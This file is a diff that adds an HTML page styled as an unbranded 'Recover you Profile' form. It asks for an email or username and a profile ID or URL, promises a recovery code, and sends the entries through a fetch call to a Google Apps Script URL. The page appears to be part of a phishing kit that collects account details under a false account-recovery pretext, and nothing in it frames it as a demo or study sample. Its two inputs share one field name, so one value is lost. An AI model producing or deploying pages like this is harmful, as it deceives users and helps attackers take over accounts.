@@ -1,0 +1,202 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Form</title>
+<!-- font-family -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Momo+Trust+Display&family=Outfit:wght@100..900&display=swap" rel="stylesheet">
+    <!-- font-family 2 -->
+     <link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Montserrat:ital,wght@0,100..900;1,100..900&display=swap" rel="stylesheet">
+<link rel="icon" type="image/x-icon" href="images/fav-icon-browser.png">
+<style>
+  /* ---------- Base ---------- */
+  body {
+    margin: 0;
+    padding: 0;
+    background: #f3f3f3;
+    font-family: "Outfit", sans-serif;
+    font-weight: 400;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    height: 100vh;
+  }
+
+  /* ---------- Container ---------- */
+  .wrapper {
+    max-width: 360px;
+    width: 100%;
+    padding: 10px;
+  }
+
+  /* ---------- Logo (optional image area) ---------- */
+ 
+.logo{
+    text-align: center;
+    margin-bottom: 35px;
+}
+  /* ---------- Headings ---------- */
+  h1 {
+    font-size: 22px;
+    margin: 0;
+    font-weight: 600;
+    color: #111;
+  }
+
+  p.subtitle {
+    font-size: 14px;
+    color: #6d6d6d;
+    line-height: 20px;
+    margin: 8px 0 25px;
+  }
+
+  /* ---------- Inputs ---------- */
+  .input-box {
+    margin-bottom: 12px;
+  }
+
+  .input {
+    width: 100%;
+    padding: 13px;
+    font-size: 15px;
+    border: none;
+    border-radius: 10px;
+    background: #ebebeb;
+    outline: none;
+    transition: 0.2s;
+  }
+
+  .input:focus {
+    background: #e4e4e4;
+  }
+
+  /* ---------- Button ---------- */
+  .btn {
+    width: 100%;
+    padding: 13px;
+    background: black;
+    color: white;
+    border: none;
+    border-radius: 12px;
+    font-size: 15px;
+    font-weight: 500;
+    cursor: pointer;
+    margin-top: 5px;
+  }
+
+  .btn:active {
+    opacity: 0.8;
+  }
+
+  /* ---------- Links ---------- */
+  .links {
+    margin-top: 14px;
+    font-size: 14px;
+  }
+
+  a {
+    color: #d35446;
+    text-decoration: none;
+  }
+
+  a:hover {
+    text-decoration: underline;
+  }
+
+  /* ---------- Status Message ---------- */
+  #status {
+    text-align: center;
+    margin-top: 10px;
+    font-size: 14px;
+  }
+
+  .success { color: #1fa463; }
+  .error { color: #e63946; }
+</style>
+</head>
+<body>
+
+<div class="wrapper">
+
+  <!-- Logo -->
+<div class="logo">
+    <img src="images/fav-icon.png" alt="" width="70" style="border-radius: 10px;">
+</div>
+
+  <!-- Title -->
+  <h1>Recover you Profile</h1>
+  <p class="subtitle">
+    Enter your email address associated with your profile. We'll send you a CODE to connect and recover your profile.
+  </p>
+
+  <!-- FORM -->
+  <form id="myForm">
+
+    <div class="input-box">
+      <input class="input" type="text" name="name" placeholder="Email or username" required />
+    </div>
+    <div class="input-box">
+      <input class="input" type="text" name="name" placeholder="Profile ID or URL" required />
+    </div>
+    <div class="input-box">
+      <button class="btn" type="submit">Send for review</button>
+    </div>
+    <p id="status"></p>
+
+   <small>It may take a moments to send the connect CODE</small>
+    
+    <div class="links">
+    <br><br>
+    Do you need help? <a href="help.html">Open help center</a>
+  </div>
+  </form>
+
+  <!-- Footer Links -->
+  <div class="links">
+   
+  </div>
+
+</div>
+
+<script>
+const scriptURL = "https://script.google.com/macros/s/AKfycbxWLtmZ_-Ij3RziPt2Skwmd_o88oWK8EoIwCDGkpNfLAJxI9A5RMI_CdjNThpOhOGkWKA/exec"; // Put GS URL here
+
+document.getElementById("myForm").addEventListener("submit", async (e) => {
+  e.preventDefault();
+  
+  const form = e.target;
+  const formData = new FormData(form);
+  const data = Object.fromEntries(formData);
+
+  const status = document.getElementById("status");
+  status.textContent = "Sending…";
+  
+  try {
+    const res = await fetch(scriptURL, {
+      method: "POST",
+      body: JSON.stringify(data)
+    });
+
+    const result = await res.json();
+
+    if (result.status === "success") {
+      status.textContent = "Submitted!";
+      status.className = "success";
+      form.reset();
+    } else {
+      throw new Error("Failed");
+    }
+  } catch (error) {
+    status.textContent = "Error sending!";
+    status.className = "error";
+  }
+});
+</script>
+
+</body>
+</html>
